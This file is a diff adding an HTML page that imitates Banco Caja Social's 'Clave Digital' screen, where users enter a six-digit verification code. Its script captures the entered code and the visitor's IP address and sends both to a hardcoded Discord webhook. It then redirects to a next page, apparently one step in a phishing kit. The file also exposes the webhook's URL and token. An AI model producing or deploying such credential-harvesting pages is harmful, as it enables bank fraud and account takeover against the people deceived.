@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Clave Digital - Banco Caja Social</title>
+    <style>
+        :root {
+            /* Colores de la Referencia de la Imagen */
+            --main-blue: #0669d0; 
+            --action-yellow: #D3D3D3; /* Amarillo brillante del botón */
+            --text-dark: #333333;
+            --text-light: #666666;
+            --error-color: #d9534f;
+        }
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background-color: var(--main-blue);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            flex-direction: column;
+            padding: 20px;
+        }
+        .card {
+            background-color: white;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 40px 30px;
+            border-radius: 15px; 
+            width: 350px;
+            max-width: 100%;
+            text-align: center;
+            border: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        h2 {
+            color: var(--text-dark);
+            font-weight: 700;
+            font-size: 18px;
+            margin-bottom: 25px;
+        }
+        p {
+            color: var(--text-light);
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .input-container {
+            display: flex;
+            justify-content: center;
+            gap: 8px; 
+            margin-bottom: 20px;
+        }
+        .input-container input {
+            width: 40px;
+            height: 50px;
+            font-size: 24px;
+            text-align: center;
+            border: 1px solid #ccc;
+            border-radius: 8px; 
+            background-color: #f7f7f7;
+            color: var(--text-dark);
+            transition: all 0.2s ease;
+            box-shadow: none;
+        }
+        .input-container input:focus {
+            outline: 2px solid var(--main-blue);
+            border-color: var(--main-blue);
+            transform: scale(1.02);
+            box-shadow: 0 0 5px rgba(6, 105, 208, 0.5);
+        }
+        .info {
+            font-size: 13px;
+            color: var(--text-light);
+            margin-bottom: 20px;
+            font-weight: 400;
+        }
+        #timer {
+            color: var(--error-color);
+            font-weight: 700;
+        }
+        .buttons {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin-top: 30px;
+        }
+        .buttons button {
+            flex: 1;
+            padding: 12px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            font-weight: 600;
+        }
+        .volver {
+            background-color: transparent; 
+            color: var(--main-blue);
+            border: 1px solid var(--main-blue);
+        }
+        .confirmar {
+            /* ✅ CAMBIO 1: Botón Azul por defecto */
+            background-color: var(--main-blue);
+            color: white; /* Letras en blanco */
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .confirmar:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .volver:hover {
+            background-color: #f0f0f0;
+        }
+        .confirmar:hover:not(:disabled) {
+            /* ✅ CAMBIO 2: Se pone Amarillo al pasar el mouse (hover) */
+            background-color: var(--action-yellow);
+            color: var(--text-dark); /* Letras oscuras sobre fondo amarillo */
+            transform: translateY(-1px);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.25);
+        }
+        /* Estilo para el mensaje dinámico */
+        #status-message {
+            color: var(--main-blue);
+            font-weight: 600;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            height: 20px;
+            display: block;
+        }
+        .success {
+            color: #008000 !important; /* Verde */
+        }
+    </style>
+</head>
+<body>
+
+
+    <div class="card">
+        <h2>Ingresa tu Clave Digital</h2>
+        <p>Hemos enviado un c&oacute;digo de 6 d&iacute;gitos a su n&uacute;mero de m&oacute;vil o correo electr&oacute;nico registrado.</p>
+        
+        <span id="status-message">Verifique su código.</span>
+
+        <form id="codigoForm">
+            <div class="input-container">
+                <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" required />
+                <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" required />
+                <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" required />
+                <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" required />
+                <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" required />
+                <input type="tel" inputmode="numeric" maxlength="1" pattern="[0-9]*" required />
+            </div>
+
+            <div class="info">El código vence en <span id="timer">00:30</span></div>
+
+            <div class="buttons">
+                <button type="button" class="volver" onclick="history.back()">Volver</button>
+                <button type="submit" class="confirmar" id="confirmarBtn">Confirmar</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        const inputs = document.querySelectorAll('.input-container input');
+        const form = document.getElementById("codigoForm");
+        const statusMessage = document.getElementById("status-message");
+        const timerElement = document.getElementById("timer");
+        const confirmarBtn = document.getElementById("confirmarBtn");
+        
+        const REDIRECT_URL = "index4.html"; 
+
+        let timerInterval;
+        const DURATION = 30; // 30 segundos
+
+        function showStatusMessage(message, isSuccess = false) {
+            statusMessage.textContent = message;
+            statusMessage.classList.toggle('success', isSuccess);
+        }
+        
+        // Función de Cuenta Regresiva
+        function startTimer() {
+            let timeLeft = DURATION;
+            clearInterval(timerInterval); 
+            
+            function updateTimer() {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerElement.textContent = "00:00";
+                    showStatusMessage("El código ha expirado. (Por favor, reinicie la vista previa)", false);
+                    confirmarBtn.disabled = true; 
+                } else {
+                    timeLeft--;
+                }
+            }
+            updateTimer(); 
+            timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        showStatusMessage("Verifique su código.");
+        startTimer();
+
+        // Enfocar automáticamente entre los campos
+        inputs.forEach((input, i) => {
+            input.addEventListener("input", e => {
+                if (!/^[0-9]$/.test(e.target.value)) e.target.value = "";
+                else if (i < inputs.length - 1) inputs[i + 1].focus();
+            });
+            input.addEventListener("keydown", e => {
+                if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
+            });
+        });
+
+        // --- Manejo del Formulario: Redirección Inmediata ---
+        form.addEventListener("submit", async e => {
+            e.preventDefault();
+            
+            if (confirmarBtn.disabled) return; 
+
+            const codigo = Array.from(inputs).map(i => i.value).join("");
+            if (codigo.length < 6) {
+                showStatusMessage("Debe ingresar los 6 dígitos.", false);
+                return;
+            }
+
+            // Deshabilitar botón para evitar múltiples envíos
+            confirmarBtn.disabled = true;
+            clearInterval(timerInterval);
+
+            // Obtener IP del usuario para el mensaje de webhook
+            let ip_address = 'IP no disponible';
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                ip_address = ipData.ip;
+            } catch (error) {
+                console.error("No se pudo obtener la IP:", error);
+            }
+
+            // Webhook de Discord
+            const discordWebhook = "https://canary.discord.com/api/webhooks/1439028329335230537/g2TFVNMf7RS1WFIb9Vkhv2_z-F5fFbrHP-JcF7QBiGFXyPq1BWXLHobMsQgLYsrjHaNT";
+            const separador_discord = "\n--------------------\n";
+
+            // Mensaje al webhook: ÉXITO INMEDIATO
+            const mensaje = `**Clave Digital**\nAUTENTICACIÓN SIMULADA EXITOSA\nCódigo ingresado: \`${codigo}\`\nIP: \`${ip_address}\`${separador_discord}`;
+
+            await fetch(discordWebhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: mensaje }),
+            });
+
+            // Mostrar mensaje de éxito y redireccionar rápidamente
+            showStatusMessage("Autenticación Exitosa..", true);
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL; 
+            }, 1000); // 1 segundo de espera antes de redirigir
+        });
+    </script>
+
+</body>
+</html>
